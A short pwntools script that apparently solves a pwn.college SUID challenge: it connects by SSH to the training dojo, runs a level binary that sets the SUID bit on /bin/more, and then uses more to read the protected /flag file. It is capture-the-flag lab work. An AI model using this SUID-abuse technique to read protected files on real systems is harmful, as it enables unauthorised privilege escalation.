from pwn import ssh, context

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level2 to make /bin/more SUID
s.process("/challenge/babysuid_level2")

# Now run /bin/more /flag
print(s.process(["/bin/more", "/flag"]).recvall().decode())

# Close the SSH connection
s.close()
